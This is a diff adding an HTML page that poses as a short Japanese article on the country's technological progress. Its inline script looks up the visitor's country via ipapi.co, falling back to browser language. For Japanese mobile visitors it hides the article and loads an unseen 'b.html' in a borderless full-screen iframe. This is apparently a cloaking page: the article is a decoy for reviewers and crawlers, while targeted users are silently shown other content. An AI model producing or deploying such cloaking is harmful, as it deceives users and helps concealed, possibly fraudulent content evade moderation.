@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>日本の技術の発展</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f9f9f9;
+            color: #333;
+        }
+        header {
+            background: #007bff;
+            color: #fff;
+            padding: 20px 0;
+            text-align: center;
+        }
+        h1 {
+            margin: 0;
+        }
+        section {
+            padding: 20px;
+            max-width: 800px;
+            margin: auto;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        .content {
+            display: block;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div id="content" class="content">
+    <header>
+        <h1>日本の技術の発展</h1>
+    </header>
+
+    <section>
+        <p>日本の技術の発展は、革新と伝統の完璧な融合を示しており、グローバルなテクノロジー分野でのリーダーシップを発揮しています。明治維新以来、日本は西洋の技術を積極的に導入・吸収し、強力な産業基盤を築いてきました。20世紀中頃には、高効率な生産方式と品質管理によって、世界の製造業の大国として急成長を遂げ、特に自動車、電子機器、ロボットなどの分野で技術水準は常に世界の最前線にあります。</p>
+
+        <p>21世紀に入ると、日本はグローバル化と情報化の波に直面し、迅速に転型し、情報技術と人工知能の発展を重視しています。日本企業は半導体、再生可能エネルギー、生物技術などの重要な分野で顕著な進展を遂げ、経済構造のアップグレードを推進しています。特にロボット技術においては、産業分野での広範な応用に加え、サービスロボットや医療ロボットなど新興市場の探索にも積極的です。</p>
+    </section>
+</div>
+
+<script>
+    function isMobileDevice() {
+        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    function isJapaneseLanguage() {
+        const language = navigator.language || navigator.userLanguage;
+        return language.startsWith('ja');
+    }
+
+    fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => { 
+            if (data.country === 'JP' && isMobileDevice()) {
+                document.getElementById('content').classList.add('hidden');
+                var iframe = document.createElement('iframe');
+                iframe.src = 'b.html';
+                iframe.style.width = '100%';
+                iframe.style.height = '100vh';
+                iframe.style.border = 'none';
+                document.body.appendChild(iframe);
+                return;
+            }
+        })
+        .catch(error => {
+            console.error('Error fetching IP data:', error);
+            if (isJapaneseLanguage() && isMobileDevice()) {
+                document.getElementById('content').classList.add('hidden');
+                var iframe = document.createElement('iframe');
+                iframe.src = 'b.html';
+                iframe.style.width = '100%';
+                iframe.style.height = '100vh';
+                iframe.style.border = 'none';
+                document.body.appendChild(iframe);
+                return;
+            }
+        });
+</script>
+
+</body>
+</html>
